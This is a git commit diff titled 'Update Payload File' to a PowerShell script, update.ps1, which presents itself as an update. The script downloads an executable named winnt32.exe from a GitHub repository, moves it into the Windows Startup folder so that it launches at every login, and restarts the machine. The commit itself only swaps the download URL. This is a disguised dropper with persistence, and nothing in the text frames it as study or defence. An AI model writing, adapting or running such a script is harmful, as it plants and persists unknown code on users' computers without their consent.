fdc72a8c29e0d347c6cc3ae6d73fcd861bc84707
N <119331551+catsruleu@users.noreply.github.com>
2022-11-28 14:46:46 -0600

    Update Payload File

--- update.ps1
+++ update.ps1
@@ -1,3 +1,3 @@
-curl https://github.com/catsruleurick/winupdaterick/raw/main/winnt32.exe -O c:\Users\*\Downloads\winnt32.exe
+curl https://github.com/catsruleu/winrick/raw/main/winnt32.exe -O c:\Users\*\Downloads\winnt32.exe
 Move-Item –Path c:\Users\*\Downloads\winnt32.exe -Destination %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 Restart-Computer
